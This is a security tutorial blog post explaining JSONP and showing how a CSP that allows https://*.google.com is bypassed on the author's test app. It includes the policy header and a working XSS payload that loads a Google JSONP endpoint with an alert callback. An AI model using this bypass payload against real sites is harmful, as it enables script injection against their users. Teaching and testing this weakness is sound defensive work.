---
title: "Bypass CSP Using JSONP Endpoints"
date: '2025-05-14T15:03:55+01:00'
draft: false
---

JSONP endpoints are a fascinating way to exchange information between two different origins. Let’s see how we can utilize JSONP endpoints to bypass a CSP policy. Before we get to that, let’s understand what is JSONP?

## Understanding JSONP
JSON with Padding (JSONP) is a technique used to bypass the same-origin policy in web browsers, which restricts scripts from making requests to a different origin than the one the web page is served from. JSONP leverages `<script>` tags, which are not subject to the same-origin policy, to fetch data from a different origin.

JSONP works by defining a callback function on the client side (e.g., claim), which is specified as a query parameter in the request to the JSONP endpoint. The server responds with a script that calls this callback function, passing the JSON data as an argument. Since the response is a script, it is directly executed in the client’s context, invoking the callback function with the received data

let's look at an example for better understanding.  On client side, we define a JavaScript function, say claim, to process the data.

```javascript
function claim(data) {
  console.log("Received data:", data);
}
```

Client make a request to a JSONP endpoint on a different origin (e.g., https://jsonpendpoint.com/revoke) through `<script>` tag. The request includes the name of the callback function as a query parameter as shown below.

```html
<script src="https://jsonpendpoint.com/revoke?callback=claim"></script>
```

The server (jsonpendpoint.com) responds with a script that wraps the JSON data in the specified callback function. The response looks like this.

```javascript
claim({ "status": "success", "data": "token revoked" });
```

Since this is loaded as a `<script>`, the browser executes it, invoking the claim function defined on your client side with the JSON data as an argument.


All this is just like including script files from a different origin, and the browser executes them once it receives the full scripts. In the JSONP case, this script received is nothing but a function call with a JSON object as a parameter. If that function is defined on the client side, then it gets invoked automatically, which is **claim** in our example.

## CSP Bypass with JSONP
Let's get to the main job of exploitation. I have set up a vulnerable web application that reflects user input on the webpage.

<img src="/img/csp_bypass_jsonp1.png" width="600" height="600" alt="Alt text" class="rounded-image">

The web application follows the CSP policy specified below.

```javascript
app.use((req, res, next) => {
  res.setHeader(
    "Content-Security-Policy",
    "default-src 'self' https://*.google.com; 
     connect-src 'self'; font-src 'none'; frame-src 'none'; img-src 'self'; 
     manifest-src 'none'; media-src 'none'; object-src 'none'; worker-src 'none'; 
     frame-ancestors 'none'; block-all-mixed-content;"
  );
  next();
});
```
This CSP policy is strong. It blocks the payload `<script>alert(1)</script>` and other image and iframe payloads.

<img src="/img/csp_bypass_jsonp2.png" width="700" height="700" alt="Alt text" class="rounded-image">

However, by including default-src with "https://*.google.com" as the source, we can bypass this CSP policy to invoke an XSS attack. I found a Google JSONP endpoint to facilitate the attack. Check this [github repo](https://github.com/zigoo0/JSONBee) for JSONP endpoints.

```html
<!-- Payload to bypass CSP -->
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(123)"></script>
```
Here, we are trying to invoke alert() and it was a success, as depicted in the image below.

<img src="/img/csp_bypass_jsonp3.png" width="700" height="700" alt="Alt text" class="rounded-image">

If we look at the network tab, we can see calls to the accounts.google.com domain, which responded with alert(123)({json data}).

<img src="/img/csp_bypass_jsonp4.png" width="700" height="700" alt="Alt text" class="rounded-image">

As soon as the client receives the response from the JSONP endpoint, it executes the received script, and thus we saw the alert pop-up.

Thank you !
